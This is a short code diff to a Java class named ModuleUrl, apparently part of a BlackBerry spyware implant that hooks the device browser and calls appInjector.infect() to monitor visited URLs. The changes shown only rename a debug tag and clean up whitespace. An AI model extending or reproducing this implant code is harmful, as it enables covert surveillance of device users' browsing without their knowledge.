@@ -34,7 +34,7 @@ import blackberry.utils.WChar;
 public final class ModuleUrl extends BaseModule implements ApplicationObserver,
         BacklightObserver {
     //#ifdef DEBUG
-    static Debug debug = new Debug("UrlAgent", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("ModUrl", DebugLevel.VERBOSE);
     //#endif
 
     String appName = "Browser";
@@ -44,15 +44,15 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
     private boolean seen = true;
     //Timer applicationTimer;
     private static final long APP_TIMER_PERIOD = 5000;
-    
+
     public static String getStaticType() {
         return "url";
     }
-    
+
     public static ModuleUrl getInstance() {
         return (ModuleUrl) ModuleManager.getInstance().get(getStaticType());
     }
-    
+
     protected boolean parse(ConfModule conf) {
         if (Device.getInstance().atLeast(6, 0)) {
             seen = false;
@@ -123,8 +123,6 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
         }
     }
 
-
-
     boolean isAppForeground;
 
     public void onApplicationChange(String startedName, String stoppedName,
@@ -150,7 +148,7 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
             //#endif
 
             appInjector.infect();
-            
+
             if (Device.getInstance().atLeast(6, 0)) {
                 seen = false;
             }
